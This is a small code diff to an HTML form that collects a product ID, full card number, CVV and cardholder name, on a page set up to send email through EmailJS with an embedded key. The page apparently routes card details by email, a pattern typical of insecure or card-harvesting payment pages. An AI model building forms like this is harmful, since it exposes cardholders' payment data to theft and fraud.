@@ -8,7 +8,7 @@
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
     (function(){
-        emailjs.init("prEhy5YOK66_5Tvfg"); //  public API key from EmailJS
+        emailjs.init("prEhy5YOK66_5Tvfg"); // Replace YOUR_USER_ID with your actual public API key from EmailJS
     })();
     
     function sendEmail() {
@@ -71,8 +71,8 @@
     <label for="productId">Product ID:</label><br>
     <input type="text" id="productId" name="productId" required><br><br>
 
-    <hr>
-    <h3>Card Payment Details</h3>
+    <label for="cardNumber">Card Number:</label><br>
+    <input type="text" id="cardNumber" name="cardNumber" required><br><br>
 
     <div class="input-row">
         <div class="input-half">
@@ -84,9 +84,6 @@
             <input type="password" id="cvv" name="cvv" maxlength="3" required>
         </div>
     </div>
-
-    <label for="cardNumber">Card Number:</label><br>
-    <input type="text" id="cardNumber" name="cardNumber" required><br><br>
 
     <label for="cardHolderName">Cardholder's Name:</label><br>
     <input type="text" id="cardHolderName" name="cardHolderName" required><br><br>
